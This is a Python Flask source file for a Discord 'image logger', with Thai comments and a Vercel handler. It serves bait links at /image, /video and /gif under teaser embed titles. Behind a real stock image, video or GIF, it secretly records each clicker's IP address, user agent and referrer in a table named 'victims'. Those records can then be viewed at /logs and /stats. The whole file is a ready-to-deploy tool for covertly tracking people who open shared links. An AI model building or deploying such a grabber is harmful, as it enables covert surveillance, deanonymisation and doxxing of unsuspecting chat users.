from flask import Flask, request, redirect, Response, send_file
import requests
import json
import sqlite3
import datetime
import io

app = Flask(__name__)

# ใช้ memory database แทน file database
def get_db_connection():
    conn = sqlite3.connect(':memory:', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    conn.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  ip TEXT, 
                  user_agent TEXT, 
                  referrer TEXT, 
                  country TEXT, 
                  timestamp TEXT, 
                  type TEXT)''')
    conn.commit()
    return conn

db_conn = init_db()

def log_victim(ip, user_agent, referrer, log_type):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        db_conn.execute(
            "INSERT INTO victims (ip, user_agent, referrer, country, timestamp, type) VALUES (?, ?, ?, ?, ?, ?)",
            (ip, user_agent, referrer, 'Unknown', timestamp, log_type)
        )
        db_conn.commit()
    except:
        pass

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>Image Logger</title>
        <meta property="og:title" content="Cool Image">
        <meta property="og:description" content="Check this out!">
        <meta property="og:image" content="https://YOUR_VERCEL_URL.vercel.app/image">
        <meta property="og:url" content="https://YOUR_VERCEL_URL.vercel.app">
    </head>
    <body>
        <h1>Image Logger Ready</h1>
        <p>Use these links in Discord:</p>
        <ul>
            <li><a href="/image">Image Logger</a></li>
            <li><a href="/video">Video Logger</a></li>
            <li><a href="/gif">GIF Logger</a></li>
        </ul>
    </body>
    </html>
    '''

@app.route('/image')
def image_logger():
    # Get victim info
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    # Log the victim
    log_victim(victim_ip, user_agent, referrer, 'IMAGE')
    
    # Serve an actual image that will show in Discord embed
    image_url = "https://images.unsplash.com/photo-1579546929662-711aa81148cf?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80"
    
    # Return the image directly
    try:
        response = requests.get(image_url, stream=True)
        return Response(
            response.iter_content(chunk_size=8192),
            content_type=response.headers['Content-Type'],
            headers={
                'Content-Length': response.headers.get('Content-Length'),
                'Cache-Control': 'no-cache'
            }
        )
    except:
        return redirect(image_url)

@app.route('/video')
def video_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'VIDEO')
    
    # Return video with proper embed headers
    video_url = "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"
    
    return f'''
    <html>
    <head>
        <meta property="og:title" content="Amazing Video">
        <meta property="og:description" content="Watch this awesome video!">
        <meta property="og:video" content="{video_url}">
        <meta property="og:video:type" content="video/mp4">
        <meta property="og:video:width" content="1280">
        <meta property="og:video:height" content="720">
    </head>
    <body>
        <video controls width="600">
            <source src="{video_url}" type="video/mp4">
        </video>
    </body>
    </html>
    '''

@app.route('/gif')
def gif_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'GIF')
    
    # Return GIF with proper embed
    gif_url = "https://media.giphy.com/media/3o7aCSPqXE5C6T8tBC/giphy.gif"
    
    return f'''
    <html>
    <head>
        <meta property="og:title" content="Funny GIF">
        <meta property="og:description" content="Check out this cool GIF!">
        <meta property="og:image" content="{gif_url}">
        <meta property="og:url" content="https://YOUR_VERCEL_URL.vercel.app/gif">
    </head>
    <body>
        <img src="{gif_url}" alt="Animated GIF">
    </body>
    </html>
    '''

@app.route('/logs')
def view_logs():
    try:
        logs = db_conn.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 50').fetchall()
        
        html = '''
        <html>
        <head><title>Logs</title></head>
        <body>
            <h1>Victim Logs</h1>
            <table border="1">
                <tr>
                    <th>ID</th>
                    <th>IP</th>
                    <th>User Agent</th>
                    <th>Time</th>
                    <th>Type</th>
                </tr>
        '''
        
        for log in logs:
            html += f'''
                <tr>
                    <td>{log['id']}</td>
                    <td>{log['ip']}</td>
                    <td>{log['user_agent'][:50]}...</td>
                    <td>{log['timestamp']}</td>
                    <td>{log['type']}</td>
                </tr>
            '''
        
        html += '''
            </table>
            <br>
            <a href="/">← Back</a>
        </body>
        </html>
        '''
        
        return html
    except:
        return "No logs available"

@app.route('/stats')
def stats():
    try:
        total = db_conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0]
        image_count = db_conn.execute('SELECT COUNT(*) FROM victims WHERE type = "IMAGE"').fetchone()[0]
        video_count = db_conn.execute('SELECT COUNT(*) FROM victims WHERE type = "VIDEO"').fetchone()[0]
        gif_count = db_conn.execute('SELECT COUNT(*) FROM victims WHERE type = "GIF"').fetchone()[0]
        
        return f'''
        <html>
        <body>
            <h1>Statistics</h1>
            <p>Total Victims: {total}</p>
            <p>Image Views: {image_count}</p>
            <p>Video Views: {video_count}</p>
            <p>GIF Views: {gif_count}</p>
            <a href="/">← Back</a>
        </body>
        </html>
        '''
    except:
        return "Error loading stats"

# Handler for Vercel
def handler(request, context):
    return app(request.environ, lambda status, headers: [])

if __name__ == '__main__':
    app.run(debug=True)
